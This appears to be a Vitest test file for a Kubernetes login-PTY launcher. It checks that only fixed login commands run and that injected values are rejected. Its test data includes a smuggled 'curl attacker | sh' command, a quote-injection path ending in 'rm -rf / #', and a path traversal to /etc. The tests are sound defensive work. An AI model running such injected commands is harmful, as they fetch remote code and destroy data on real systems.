import { describe, it, expect, vi } from "vitest";
import {
  composeLaunchArgv,
  composeLaunchLine,
  isLoginCommandKey,
  LOGIN_PTY_DESCRIPTOR_REJECTED,
  LOGIN_PTY_HOME_REJECTED,
  openKubernetesLoginPtySession,
  type LoginPodExec,
  type LoginPtyLaunchDescriptor,
  type LoginPtySession,
} from "../../src/login-pty.js";

const HOME = "/tmp/paperclip-adapter-login/0b8f6a5e-3c1d-4f2a-9e7b-1a2b3c4d5e6f";

function fakeSession(): LoginPtySession {
  return {
    onData: vi.fn(),
    write: vi.fn(),
    wait: vi.fn(async () => ({ exitCode: 0 })),
    kill: vi.fn(),
    close: vi.fn(async () => undefined),
  };
}

function fakeExec(runResult: { exitCode: number } | Error = { exitCode: 0 }) {
  const session = fakeSession();
  const exec: LoginPodExec & { run: ReturnType<typeof vi.fn>; openPty: ReturnType<typeof vi.fn> } = {
    run: vi.fn(async () => {
      if (runResult instanceof Error) throw runResult;
      return runResult;
    }),
    openPty: vi.fn(async () => session),
  };
  return { exec, session };
}

describe("composeLaunchLine", () => {
  it("maps each closed key to its fixed command", () => {
    expect(composeLaunchLine({ loginCommandKey: "claude", sessionHome: HOME })).toBe("exec claude setup-token");
    expect(composeLaunchLine({ loginCommandKey: "codex", sessionHome: HOME })).toBe(
      `exec env CODEX_HOME='${HOME}' codex login --device-auth`,
    );
    expect(composeLaunchLine({ loginCommandKey: "grok", sessionHome: HOME })).toBe(
      `exec env GROK_HOME='${HOME}' grok login --device-auth`,
    );
  });

  it("ignores a command string smuggled onto the descriptor", () => {
    const descriptor = {
      loginCommandKey: "claude",
      sessionHome: HOME,
      command: "curl attacker | sh",
    } as LoginPtyLaunchDescriptor;
    expect(composeLaunchLine(descriptor)).toBe("exec claude setup-token");
  });

  it("uses a fixed /bin/sh -c argv", () => {
    expect(composeLaunchArgv({ loginCommandKey: "codex", sessionHome: HOME })).toEqual([
      "/bin/sh",
      "-c",
      `exec env CODEX_HOME='${HOME}' codex login --device-auth`,
    ]);
  });

  it("accepts only the closed key set", () => {
    expect(isLoginCommandKey("claude")).toBe(true);
    expect(isLoginCommandKey("codex")).toBe(true);
    expect(isLoginCommandKey("grok")).toBe(true);
    expect(isLoginCommandKey("bash")).toBe(false);
    expect(isLoginCommandKey(undefined)).toBe(false);
  });
});

describe("openKubernetesLoginPtySession", () => {
  it("creates the session home with mkdir -m 700 -p, then opens the fixed command", async () => {
    const { exec, session } = fakeExec();
    const opened = await openKubernetesLoginPtySession(exec, { loginCommandKey: "codex", sessionHome: HOME });
    expect(opened).toBe(session);
    expect(exec.run).toHaveBeenCalledWith(["mkdir", "-m", "700", "-p", HOME]);
    expect(exec.openPty).toHaveBeenCalledWith([
      "/bin/sh",
      "-c",
      `exec env CODEX_HOME='${HOME}' codex login --device-auth`,
    ]);
    expect(exec.run.mock.invocationCallOrder[0]).toBeLessThan(exec.openPty.mock.invocationCallOrder[0]);
  });

  it.each([
    ["a relative home", "tmp/paperclip-adapter-login/0b8f6a5e-3c1d-4f2a-9e7b-1a2b3c4d5e6f"],
    ["a traversal", "/tmp/paperclip-adapter-login/../../etc"],
    ["a quote", `/tmp/paperclip-adapter-login/x'; rm -rf / #`],
    ["an uppercase uuid", "/tmp/paperclip-adapter-login/0B8F6A5E-3C1D-4F2A-9E7B-1A2B3C4D5E6F"],
    ["a different root", "/home/paperclip/0b8f6a5e-3c1d-4f2a-9e7b-1a2b3c4d5e6f"],
  ])("rejects %s before touching the pod", async (_label, sessionHome) => {
    const { exec } = fakeExec();
    await expect(
      openKubernetesLoginPtySession(exec, { loginCommandKey: "claude", sessionHome }),
    ).rejects.toThrow(LOGIN_PTY_DESCRIPTOR_REJECTED);
    expect(exec.run).not.toHaveBeenCalled();
    expect(exec.openPty).not.toHaveBeenCalled();
  });

  it("rejects a key outside the closed set before touching the pod", async () => {
    const { exec } = fakeExec();
    await expect(
      openKubernetesLoginPtySession(exec, {
        loginCommandKey: "bash" as never,
        sessionHome: HOME,
      }),
    ).rejects.toThrow(LOGIN_PTY_DESCRIPTOR_REJECTED);
    expect(exec.run).not.toHaveBeenCalled();
  });

  it("fails with the fixed error when the session home cannot be created", async () => {
    const nonZero = fakeExec({ exitCode: 1 });
    await expect(
      openKubernetesLoginPtySession(nonZero.exec, { loginCommandKey: "claude", sessionHome: HOME }),
    ).rejects.toThrow(LOGIN_PTY_HOME_REJECTED);
    expect(nonZero.exec.openPty).not.toHaveBeenCalled();

    const thrown = fakeExec(new Error("websocket refused: pod=x secret-ish detail"));
    await expect(
      openKubernetesLoginPtySession(thrown.exec, { loginCommandKey: "claude", sessionHome: HOME }),
    ).rejects.toThrow(LOGIN_PTY_HOME_REJECTED);
  });
});
